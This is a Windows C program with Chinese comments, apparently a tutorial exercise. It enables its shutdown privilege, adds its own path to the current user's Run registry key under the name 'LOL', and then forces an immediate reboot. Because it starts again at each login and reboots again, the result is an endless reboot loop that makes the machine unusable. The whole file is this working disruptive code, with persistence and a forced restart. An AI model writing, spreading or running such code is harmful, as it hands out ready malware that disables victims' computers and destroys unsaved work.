#include<stdio.h>
#include<windows.h>
 
int main(int argc, char**argv)
{
	//提升进程权限
	HANDLE hToken; 
	if(FALSE==OpenProcessToken(GetCurrentProcess(),TOKEN_ALL_ACCESS,&hToken)) //打开当前程序,所有权限 
	{
		printf("打开访问令牌失败。\n");
		return 0;
	}
	//查看权限
	 LUID luid;
	if(FALSE==LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&luid)) //NULL自己机器的权限 
	{
		printf("查看权限失败。\n");
		return 0; 
	}
	
	//修改权限
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid=luid;
	
	TOKEN_PRIVILEGES oldtkp;
	if(FALSE==AdjustTokenPrivileges(hToken,FALSE,&tkp,sizeof(tkp),NULL,0)) //FALSE是不禁用权限 
	{
		printf("调节特权失败");
		return 0; 
	}
	
	
	//1.打开注册表(regedit )
	HKEY hKey;
	if(ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER,(const char *)"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_ALL_ACCESS,&hKey))
	{	//ERROR_SUCCESS可以写成0，他说0表示成功。 
		printf("打开注册表失败\n");
		return 0;
	}
	
	//2.获取exe路径
	TCHAR szExePath[260];
	GetModuleFileName(NULL,szExePath,260); 
	
	//3.往注册表里写东西 
	RegSetValueEx(hKey,(const char*)"LOL",0,REG_SZ,(BYTE*)szExePath,strlen(szExePath)); //REG_SZ表示字符串可以在注册表里面查看类型 
	//BYTE* 是 unsigned char* 
	
	//4.关闭注册表
	RegCloseKey(hKey);
	
	//5.重启
	ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0); 
	 
	return 0;
}
